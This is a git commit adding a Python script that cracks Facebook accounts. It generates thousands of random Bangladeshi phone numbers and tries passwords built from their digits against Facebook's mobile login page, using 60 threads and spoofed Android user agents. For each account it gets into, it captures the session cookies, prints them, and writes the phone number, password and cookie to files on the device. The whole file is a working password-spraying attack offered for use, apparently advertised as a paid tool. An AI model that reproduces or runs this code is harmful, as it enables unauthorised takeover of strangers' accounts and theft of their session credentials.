7cd1f386264e581459c3090d13af1ee2ebe79e77
Dx-Fahim <136869642+Dx-Fahim@users.noreply.github.com>
2023-07-07 22:37:14 +0600

    Fahim
    Hello Would

---
+++ Fahim Fb.py
@@ -0,0 +1,167 @@
+import os,time,sys
+os.system('clear')
+from os import path
+import os,base64,zlib,pip,urllib
+from bs4 import BeautifulSoup as sop
+from bs4 import BeautifulSoup
+try:
+        import os,requests,json,time,re,random,sys,uuid,string,subprocess
+        from string import *
+        from concurrent.futures import ThreadPoolExecutor as tred
+except ModuleNotFoundError:
+        os.system(f'pip install requests futures==2 > /dev/null')
+except:pass
+logo = ("""
+\033[1;92m_______   __     ______      _    _ _____ __  __ 
+\033[1;92m|  __ \ \ / /    |  ____/\   | |  | |_   _|  \/  |
+\033[1;92m| |  | \ V /_____| |__ /  \  | |__| | | | | \  / |
+\033[1;92m| |  | |> <______|  __/ /\ \ |  __  | | | | |\/| |
+\033[1;92m| |__| / . \     | | / ____ \| |  | |_| |_| |  | |
+\033[1;92m|_____/_/ \_\    |_|/_/    \_\_|  |_|_____|_|  |_|                                                                                                                                                                                                                                                                                                                                                         
+\033[1;91m[ 𝑭𝑶𝑳𝑳𝑶𝑾  𝑴𝒀 𝑭𝑨𝑪𝑬𝑩𝑶𝑶𝑲  𝑨𝑵𝑫  𝑵𝑬𝑾  𝑪𝑶𝑴𝑴𝑨𝑵𝑫 ] 
+ \033[1;91m𝑾𝑬𝑳𝑪𝑶𝑴𝑬  𝑻𝑶  𝑴𝒀  𝑭𝑨𝑪𝑬𝑩𝑶𝑶𝑲\033[1;36m                                            
+\033[1;92m══════════════════════════════════════════════════════           
+\033[1;93m [🙂] 𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊 : 𝑫𝑿 𝑭𝑨𝑯𝑰𝑴\_______ ;* :/ 3:) ‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎
+\033[1;94m [🙂] 𝐆𝐈𝐓𝐇𝐔𝐁 : 𝑫𝑿 - 𝑭𝑨𝑯𝑰𝑴
+ \033[1;95m[🙂] 𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏 :  𝑯𝑰𝑫𝑬
+ \033[1;96m[🙂] 𝐓𝐎𝐎𝐋𝐒 : 𝑷𝑨𝑰𝑫
+ \033[1;97m[🙂] 𝐕𝐈𝐑𝐒𝐈𝐎𝐍 : 0.01
+\033[1;92m══════════════════════════════════════════════════════""")
+ok = []
+cp = []
+id = []
+session = requests.Session()
+user = []
+loop = 0
+oks = []
+cps = []
+loop = 0
+ugen=[]
+for ua in range(1000):
+      a='Mozilla/5.0 (Linux; Android'
+      b=random.choice(['12' , '13' , '14' , '15'])
+      c='SM-A125U Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
+      d=random.randrange(40,100)
+      e='0'
+      f=random.randrange(3000,6000)
+      g=random.randrange(20,100)
+      h='Mobile Safari/537.36'
+      ug=(f"{a} {b}; {c}{d}.{e}.{f}.{g} {h}")
+      ugen.append(ug)
+      ugen=[]
+for tg in range(5000):
+	a='Mozilla/5.0 (Linux; Android'
+	b=random.choice(['9','10','11','12','13','14','15'])
+	c='SM-A105FN Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
+	d=random.randrange(40,115)
+	e='0'
+	f=random.randrange(3000,6000)
+	g=random.randrange(20,100)
+	h='Mobile Safari/537.36'
+	nobin=(f"{a} {b}; {c}{d}.{e}.{f}.{g} {h}")
+	ugen.append(nobin)
+	import os,random
+ugen=[]
+for tg in range(5000):
+	a='Mozilla/5.0 (Linux; Android'
+	b=random.choice(['9','10','11','12','13','14','15'])
+	c='SM-A105FN Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
+	d=random.randrange(40,115)
+	e='0'
+	f=random.randrange(3000,6000)
+	g=random.randrange(20,100)
+	h='Mobile Safari/537.36'
+	nobin=(f"{a} {b}; {c}{d}.{e}.{f}.{g} {h}")
+	ugen.append(nobin)
+def Main():
+	os.system('clear')
+	os.system('xdg-open https://www.facebook.com/fahim.r.2445?mibextid=ZbWKwL/')
+	print(logo)
+	print("[+] \033[1;96m BD SIM CODE : [017 018 019 013 015 016] ")
+	love = input('[+] SELECT : ')
+	print('[+] EXAMPLE : [1000,5000,10000,15000,20000] ')
+	limit = int(input('[+] LIMIT : '))
+	for nmbr in range(limit):
+		lova = ''.join(random.choice(string.digits) for _ in range(2))
+		lovb = ''.join(random.choice(string.digits) for _ in range(2))
+		nmp = ''.join(random.choice(string.digits) for _ in range(4))
+		user.append(nmp)
+	with tred(max_workers=60) as turag:
+		os.system('clear')
+		print(logo)
+		tl = str(len(user))
+		print('[+]\033[1;96m CHOICE CODE : '+love)
+		print('[+] TOTAL ID   :  '+tl)
+		print('[+] CRACK STARTED....... ')
+		print(50*'━')
+		for guru in user:
+			uid = love+lova+lovb+guru
+			pwx = [lova+lovb+guru,love+lova+lovb,love+love]
+			turag.submit(test,uid,pwx,tl)
+	print(50*'━')
+	print(' [+] \033[1;96m CRACK DONE......... ')
+	print(50*'━')
+	exit()
+def test(uid,pwx,tl):
+    global loop
+    global cps    
+    global oks
+    global agents
+    try:
+        for ps in pwx:
+            session = requests.Session()
+            sys.stdout.write(f'\r\033[1;90m[\033[1;92m𝐃𝐗 - 𝐅𝐀𝐇𝐈𝐌-😺\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
+            sys.stdout.flush()
+            pro = random.choice(ugen)
+            free_fb = session.get('https://x.facebook.com').text
+            log_data = {
+                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
+            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
+            "try_number":"0",
+            "unrecognized_tries":"0",
+            "email":uid,
+            "pass":ps,
+            "login":"Log In"}
+            header_freefb ={'authority': 'mbasic.facebook.com',
+            'method': 'GET',
+            'path': ' /',
+            'scheme': 'https', 
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'accept-language': 'en-US,en;q=0.9',
+            'cache-control': 'max-age=0',
+            'sec-ch-prefers-color-scheme': 'light',
+            'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
+            'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-ch-ua-platform-version': '"12.0.0"',
+            'sec-fetch-dest': 'document',
+            'sec-fetch-mode': 'navigate',
+            'sec-fetch-site': 'none',
+            'sec-fetch-user': '?1',
+            'upgrade-insecure-requests': '1',
+            'user-agent': pro,}
+            lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
+            log_cookies=session.cookies.get_dict().keys()
+            if 'c_user' in log_cookies:
+                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                cid = coki[65:80]
+                print(f'\r\33[1;92m[FAHIM-💘-OK] '+uid+' ¤ '+ps+'\n\33[0;92mCOOKIE : '+coki)
+                oks.append(uid)
+                open('/sdcard/FAHIM-ok.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
+                break
+            elif 'checkpoint' in log_cookies:
+                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                cid = coki[65:80]
+                print(f"\r\33[1;91m[FAHIM-😈-CP] {uid} ¤ {ps}")
+                open('/sdcard/FAHIM-CP.txt', 'a').write( uid+' | '+ps+' \n')
+                cps.append(uid)
+                break
+            else:
+                continue
+        loop+=1        
+    except:
+        pass
+Main()
